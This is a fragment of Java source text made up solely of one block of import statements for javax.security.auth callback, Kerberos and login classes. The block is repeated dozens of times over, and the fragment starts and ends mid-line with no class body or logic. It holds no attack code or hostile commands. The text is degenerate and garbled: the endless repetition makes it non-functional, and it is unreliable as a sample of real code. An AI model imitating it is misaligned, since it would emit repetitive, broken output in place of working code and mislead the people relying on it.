javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport 